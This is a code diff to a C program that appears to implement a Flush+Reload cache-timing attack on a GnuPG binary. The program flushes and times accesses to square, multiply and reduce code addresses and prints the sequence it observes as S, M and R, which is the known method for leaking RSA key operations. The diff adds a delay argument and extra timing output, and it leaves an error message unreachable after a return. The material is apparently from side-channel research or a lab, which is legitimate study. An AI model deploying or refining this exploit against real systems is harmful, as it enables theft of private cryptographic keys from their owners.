@@ -4,8 +4,8 @@
 #include <unistd.h>
 #include <math.h>
 
-void do_something() {
-    for(int i=0;i < 100;i++) {
+void do_something(int times) {
+    for(int i=0;i < times;i++) {
         int j = i*2;
         j++;
     }
@@ -29,12 +29,11 @@ unsigned long long get_clflush_threshold (void *flush_addr) {
             //do_something();
         }
         else{
-        	measure_one_block_access_time((void*)y);
+            measure_one_block_access_time((void*)y);
         }
-
         access_times[i] = measure_one_block_access_time ((void *)y);
     }
-    
+
     qsort (access_times, NUM_ACCESSES, sizeof (long long), compare);
     for (int i = 0; i < NUM_ACCESSES; i++)
         if (i < (NUM_ACCESSES / 2))
@@ -46,11 +45,18 @@ unsigned long long get_clflush_threshold (void *flush_addr) {
     return floor (0.8 * first_half_mean + 0.2 * second_half_mean);
 }
 
-int main() {
+int main(int argc, char **argv) {
     int fd = open(gnupg_path, O_RDONLY);
     unsigned char *addr;
     unsigned long long THRESHOLD;
+    int times;
     void *s_addr, *m_addr, *r_addr;
+
+    if (argc != 2)
+    {
+        return -1;
+        perror ("Not enough args given!\n");
+    }
 
     if (fd < 3)
     {
@@ -58,6 +64,7 @@ int main() {
         return 3;
     }
 
+    times = atoi (argv[1]);
     // map the binary (upto 64 MB)
     addr = (unsigned char *) mmap(0, 64 * 1024 * 1024, PROT_READ, MAP_SHARED, fd, 0);
     THRESHOLD = get_clflush_threshold ((void *)addr);
@@ -73,12 +80,16 @@ int main() {
     long long s = 0, m = 0, r = 0, i = 0;
     while (i < 1000000) {
         unsigned long long atime;
+        unsigned long long btime;
 
         clflush(m_addr);
         clflush(r_addr);
         clflush(s_addr);
+        clflush(&i);
 
         atime = measure_one_block_access_time ((void *) m_addr);
+        btime = measure_one_block_access_time ((void *) &i);
+        printf ("%lld, %lld\n", atime, btime);
         if (atime < THRESHOLD)
         {
             printf ("M");
@@ -100,7 +111,7 @@ int main() {
             s++;
         }
         i++;
-        do_something();
+        do_something(times);
     }
     printf ("\n");
     return 0;
